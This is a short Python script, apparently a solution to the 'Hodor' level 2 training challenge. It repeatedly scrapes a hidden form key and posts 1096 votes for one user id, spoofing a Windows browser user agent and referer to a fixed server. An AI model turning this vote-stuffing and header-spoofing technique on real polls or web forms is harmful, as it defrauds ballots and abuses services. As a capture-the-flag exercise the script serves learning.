#!/usr/bin/python3
'''
Module for Hodor level 2 challenge.

Has to have a WINDOW's user agent.

Has to parse the hidden 'key' field's 'value' from a GET request

Has to add the user's 'id' and 'holdthedoor' fields to POST request.

'''
import requests
import re
import time

url = 'http://158.69.76.135/level2.php'
data = {'id': '650', 'holdthedoor': 'Submit'}
referer = url
agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
headers = {'User-Agent': agent, 'Referer': url}
success = 'Hold the Door challenge - Level 2'
votes = 1096
ok = 0
fail = 0
s = requests.Session()
s.headers.update(headers)

while ok < votes and fail < 100:
    try:
        response = s.get(url, headers=headers)
        if response.status_code is not 200:
            continue
        matches = re.findall("value=\"([^\"]+)\"",
                             response.text)
        if not len(matches):
            continue

        data["key"] = matches[0]
        # print(data)
        response = s.post(url, data=data)
        # print(response.text)
        if response.status_code is 200 and success in response.text:
            fail = 0
            ok += 1
            print("{} ok!".format(ok))
    except Exception as e:
        print(e)
        fail += 1

print("Finished: {}/{} votes.".format(ok, votes))
